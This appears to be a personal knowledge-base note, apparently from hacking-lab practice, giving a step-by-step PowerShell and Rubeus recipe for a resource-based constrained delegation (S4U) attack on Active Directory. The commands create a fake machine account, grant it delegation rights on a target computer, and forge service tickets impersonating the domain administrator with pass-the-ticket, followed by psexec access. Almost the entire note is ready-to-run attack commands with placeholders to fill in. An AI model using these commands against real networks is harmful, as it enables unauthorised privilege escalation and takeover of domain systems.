# resource based constrained delegation S4U attack powershell commands on target
https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation
- powermad https://github.com/Kevin-Robertson/Powermad
- targetComputer = the machine to privesc
- FAKECOMPUTER = the machine we added
- use rubeus to hash
- replace hashes in s4u command
- replace domain and FQDN

```powershell
#Import Powermad and use it to create a new MACHINE ACCOUNT
. .\Powermad.ps1
New-MachineAccount -MachineAccount FAKECOMPUTER -Password $(ConvertTo-SecureString 'p@ssword!' -AsPlainText -Force) -Verbose

$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

# substitute domain
.\Rubeus.exe hash /password:'p@ssword!' /user:FAKECOMPUTER$ /domain:domain.local
# substitute hashes, domain, fqdn
.\rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:HASH_HERE /aes128:HASH_HERE /rc4:HASH_HERE /impersonateuser:administrator /msdsspn:cifs/FQDNMachine.domain.local /domain:domain.local /ptt
# copy base64 from smb ticket to your machine and decode it to do impacket-psexec

# alternate command - request all kinds of tickets
.\rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:HASH_HERE /aes128:HASH_HERE /rc4:HASH_HERE /impersonateuser:administrator /msdsspn:cifs/FQDNMachine.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```

` zet/20221003151147/README.md `

# Related

- [20221014185652](/zet/20221014185652/README.md) kb file named kb/hacking/windows/AD-resource-based-constrained-delegation-attack.md
- [20221011183500](/zet/20221011183500/README.md) potential exploits
- [20221008215655](/zet/20221008215655/README.md) user account
- [20221006213414](/zet/20221006213414/README.md) retired machines
- [20221003151144](/zet/20221003151144/README.md) active directory 
- [20221003150967](/zet/20221003150967/README.md) things to check in bloodhound
- [20221003150677](/zet/20221003150677/README.md) bloodhound
- [20221003151148](/zet/20221003151148/README.md) resource based constrained delegation S4U attack
- ~/kb/hacking/windows/AD-resource-based-constrained-delegation-attack.md

Tags:

    #hacking #windows #ad #trick
